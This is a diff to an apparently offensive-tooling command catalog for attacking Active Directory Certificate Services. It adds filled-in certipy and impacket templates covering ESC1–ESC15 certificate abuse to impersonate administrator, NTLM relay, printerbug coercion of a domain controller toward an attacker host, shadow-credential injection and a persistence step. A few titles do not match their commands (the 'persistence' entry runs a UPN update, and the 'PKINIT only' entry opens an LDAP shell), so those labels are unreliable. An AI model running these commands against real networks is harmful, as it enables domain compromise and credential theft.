@@ -3,63 +3,233 @@ display_name = "ADCS"
 icon = "󰒃"
 order = 50
 
+# === Enumeration ===
+
 [[command]]
 id = "adcs.certipy.find"
 title = "certipy find — enumerate templates + CAs"
-template = "certipy-ad find -u '{user}@{domain}' -p '{password}' -dc-ip {dc} -text -output ca_findings"
+template = "certipy-ad find -u '{user}@{domain}' -p '{password}' -dc-ip {dc} -text -stdout -output ca_findings"
 requires = ["certipy-ad"]
 tags = ["enum"]
 when = "creds.kind == 'plaintext' and target.has_dc"
 
 [[command]]
 id = "adcs.certipy.find_vulnerable"
-title = "certipy find -vulnerable"
-template = "certipy-ad find -u '{user}@{domain}' -p '{password}' -dc-ip {dc} -vulnerable -stdout"
+title = "certipy find -vulnerable -enabled"
+template = "certipy-ad find -u '{user}@{domain}' -p '{password}' -dc-ip {dc} -vulnerable -enabled -stdout"
 requires = ["certipy-ad"]
 tags = ["enum", "vulnerable"]
 when = "creds.kind == 'plaintext' and target.has_dc"
 
 [[command]]
-id = "adcs.certipy.esc1"
-title = "certipy ESC1 — request cert as SAN"
-template = "certipy-ad req -u '{user}@{domain}' -p '{password}' -ca CA_NAME -template TEMPLATE_NAME -upn administrator@{domain}"
+id = "adcs.certipy.find.hash"
+title = "certipy find — auth via NTLM hash"
+template = "certipy-ad find -u '{user}@{domain}' -hashes ':{nt_hash}' -dc-ip {dc} -vulnerable -enabled -stdout"
+requires = ["certipy-ad"]
+tags = ["enum"]
+when = "creds.kind == 'ntlm' and target.has_dc"
+
+# === ESC1 — Enrollee-supplied SAN ===
+
+[[command]]
+id = "adcs.esc1.request"
+title = "certipy ESC1 — request cert with SAN"
+template = "certipy-ad req -u '{user}@{domain}' -p '{password}' -ca CA_NAME -template VULN_TEMPLATE -upn administrator@{domain} -dns {dc}"
 requires = ["certipy-ad"]
 tags = ["esc1"]
 when = "creds.kind == 'plaintext'"
 
 [[command]]
-id = "adcs.certipy.esc4"
-title = "certipy ESC4 — modify template ACL"
-template = "certipy-ad template -u '{user}@{domain}' -p '{password}' -template TEMPLATE_NAME -save-old"
+id = "adcs.esc1.auth_pfx"
+title = "certipy auth — UPN, then NTLM"
+template = "certipy-ad auth -pfx administrator.pfx -dc-ip {dc}"
+requires = ["certipy-ad"]
+tags = ["esc1", "auth"]
+
+# === ESC2 — Any-purpose EKU ===
+
+[[command]]
+id = "adcs.esc2.request"
+title = "certipy ESC2 — Any Purpose EKU"
+template = "certipy-ad req -u '{user}@{domain}' -p '{password}' -ca CA_NAME -template ESC2_TEMPLATE -upn administrator@{domain}"
+requires = ["certipy-ad"]
+tags = ["esc2"]
+when = "creds.kind == 'plaintext'"
+
+# === ESC3 — Enrollment Agent ===
+
+[[command]]
+id = "adcs.esc3.request_agent"
+title = "certipy ESC3 — request enrollment agent cert"
+template = "certipy-ad req -u '{user}@{domain}' -p '{password}' -ca CA_NAME -template EnrollmentAgent"
+requires = ["certipy-ad"]
+tags = ["esc3"]
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "adcs.esc3.request_on_behalf"
+title = "certipy ESC3 — request 'on-behalf-of' admin"
+template = "certipy-ad req -u '{user}@{domain}' -p '{password}' -ca CA_NAME -template User -on-behalf-of '{domain}\\administrator' -pfx agent.pfx"
+requires = ["certipy-ad"]
+tags = ["esc3"]
+when = "creds.kind == 'plaintext'"
+
+# === ESC4 — Template ACL ===
+
+[[command]]
+id = "adcs.esc4.save_template"
+title = "certipy ESC4 — backup template ACL"
+template = "certipy-ad template -u '{user}@{domain}' -p '{password}' -template VULN_TEMPLATE -save-old"
 requires = ["certipy-ad"]
 tags = ["esc4"]
 when = "creds.kind == 'plaintext'"
 
 [[command]]
-id = "adcs.certipy.esc8"
-title = "certipy ESC8 — relay HTTP enrollment"
-template = "certipy-ad relay -target http://{dc} -template DomainController"
+id = "adcs.esc4.restore_template"
+title = "certipy ESC4 — restore template (cleanup)"
+template = "certipy-ad template -u '{user}@{domain}' -p '{password}' -template VULN_TEMPLATE -configuration VULN_TEMPLATE.json"
 requires = ["certipy-ad"]
-tags = ["esc8", "relay", "noisy"]
+tags = ["esc4", "cleanup"]
+when = "creds.kind == 'plaintext'"
+
+# === ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 ===
 
 [[command]]
-id = "adcs.certipy.auth_with_pfx"
-title = "certipy auth — get TGT from PFX"
-template = "certipy-ad auth -pfx administrator.pfx -dc-ip {dc}"
+id = "adcs.esc6.request"
+title = "certipy ESC6 — set SAN via -upn"
+template = "certipy-ad req -u '{user}@{domain}' -p '{password}' -ca CA_NAME -template User -upn administrator@{domain}"
 requires = ["certipy-ad"]
-tags = ["auth"]
+tags = ["esc6"]
+when = "creds.kind == 'plaintext'"
+
+# === ESC7 — CA ACL (officer / manager) ===
 
 [[command]]
-id = "adcs.certipy.shadow_credentials"
+id = "adcs.esc7.approve_request"
+title = "certipy ESC7 — approve pending request as Officer"
+template = "certipy-ad ca -ca CA_NAME -issue-request REQUEST_ID -u '{user}@{domain}' -p '{password}'"
+requires = ["certipy-ad"]
+tags = ["esc7"]
+when = "creds.kind == 'plaintext'"
+
+# === ESC8 — NTLM Relay to HTTP enrollment ===
+
+[[command]]
+id = "adcs.esc8.relay_setup"
+title = "ntlmrelayx — relay to HTTP CA (ESC8)"
+template = "impacket-ntlmrelayx -t http://CA_HOST/certsrv/certfnsh.asp --adcs --template DomainController"
+requires = ["impacket-ntlmrelayx"]
+tags = ["esc8", "relay"]
+
+[[command]]
+id = "adcs.esc8.coerce"
+title = "ESC8: coerce DC (use printerbug/petitpotam to feed relay)"
+template = "impacket-printerbug '{domain}/{user}:{password}@{dc}' {lhost}"
+requires = ["impacket-printerbug"]
+tags = ["esc8", "coerce"]
+when = "creds.kind == 'plaintext' and target.has_dc and target.has_lhost"
+
+[[command]]
+id = "adcs.esc8.certipy_relay"
+title = "certipy relay — auto target template"
+template = "certipy-ad relay -target http://CA_HOST -template DomainController -ca CA_NAME"
+requires = ["certipy-ad"]
+tags = ["esc8", "relay"]
+
+# === ESC9 / ESC10 — UPN abuse ===
+
+[[command]]
+id = "adcs.esc9.upn_abuse"
+title = "certipy ESC9 — UPN to admin chaining"
+template = "certipy-ad req -u '{user}@{domain}' -p '{password}' -ca CA_NAME -template VULN -upn administrator@FAKE_DOMAIN -dc-ip {dc}"
+requires = ["certipy-ad"]
+tags = ["esc9"]
+when = "creds.kind == 'plaintext'"
+
+# === ESC11 — IF_ENFORCEENCRYPTICERTREQUEST off ===
+
+[[command]]
+id = "adcs.esc11.relay"
+title = "certipy relay — ESC11 RPC relay (no signing)"
+template = "certipy-ad relay -target rpc://CA_HOST -template DomainController -ca CA_NAME"
+requires = ["certipy-ad"]
+tags = ["esc11"]
+
+# === ESC13 — Issuance policy → group ===
+
+[[command]]
+id = "adcs.esc13.request"
+title = "certipy ESC13 — request cert with linked group OID"
+template = "certipy-ad req -u '{user}@{domain}' -p '{password}' -ca CA_NAME -template ESC13_TEMPLATE"
+requires = ["certipy-ad"]
+tags = ["esc13"]
+when = "creds.kind == 'plaintext'"
+
+# === ESC14 / shadow credentials ===
+
+[[command]]
+id = "adcs.shadow_credentials"
 title = "certipy shadow — add msDS-KeyCredentialLink"
-template = "certipy-ad shadow auto -u '{user}@{domain}' -p '{password}' -account VICTIM"
+template = "certipy-ad shadow auto -u '{user}@{domain}' -p '{password}' -account TARGET_USER"
 requires = ["certipy-ad"]
 tags = ["shadow", "esc14"]
 when = "creds.kind == 'plaintext'"
 
 [[command]]
-id = "adcs.certipy.cert"
-title = "certipy cert (extract from pfx)"
-template = "certipy-ad cert -pfx administrator.pfx -nocert -out admin.key"
+id = "adcs.shadow.list"
+title = "certipy shadow list (existing keys)"
+template = "certipy-ad shadow list -u '{user}@{domain}' -p '{password}' -account TARGET_USER"
 requires = ["certipy-ad"]
-tags = ["cert"]
+tags = ["shadow", "list"]
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "adcs.shadow.clear"
+title = "certipy shadow clear (cleanup)"
+template = "certipy-ad shadow clear -u '{user}@{domain}' -p '{password}' -account TARGET_USER"
+requires = ["certipy-ad"]
+tags = ["shadow", "cleanup"]
+when = "creds.kind == 'plaintext'"
+
+# === ESC15 (modifiable application policies / weak CSPs) ===
+
+[[command]]
+id = "adcs.esc15.request"
+title = "certipy ESC15 — application policy abuse"
+template = "certipy-ad req -u '{user}@{domain}' -p '{password}' -ca CA_NAME -template WebServer -application-policies 'Client Authentication'"
+requires = ["certipy-ad"]
+tags = ["esc15"]
+when = "creds.kind == 'plaintext'"
+
+# === Auth / cert lifecycle ===
+
+[[command]]
+id = "adcs.certipy.auth_with_pfx"
+title = "certipy auth — get TGT + NTLM from PFX"
+template = "certipy-ad auth -pfx target.pfx -dc-ip {dc}"
+requires = ["certipy-ad"]
+tags = ["auth"]
+when = "target.has_dc"
+
+[[command]]
+id = "adcs.certipy.auth_with_pfx.no_ntlm"
+title = "certipy auth — PKINIT only (no NTLM exchange)"
+template = "certipy-ad auth -pfx target.pfx -dc-ip {dc} -ldap-shell"
+requires = ["certipy-ad"]
+tags = ["auth", "pkinit"]
+when = "target.has_dc"
+
+[[command]]
+id = "adcs.certipy.cert_extract"
+title = "certipy cert — extract key from PFX"
+template = "certipy-ad cert -pfx target.pfx -nocert -out target.key"
+requires = ["certipy-ad"]
+tags = ["cert", "extract"]
+
+[[command]]
+id = "adcs.certipy.account_persistence"
+title = "certipy account — set msDS-KeyCredentialLink for persistence"
+template = "certipy-ad account update -u '{user}@{domain}' -p '{password}' -account ADMIN_TARGET -newupn 'administrator@{domain}'"
+requires = ["certipy-ad"]
+tags = ["persistence"]
+when = "creds.kind == 'plaintext'"
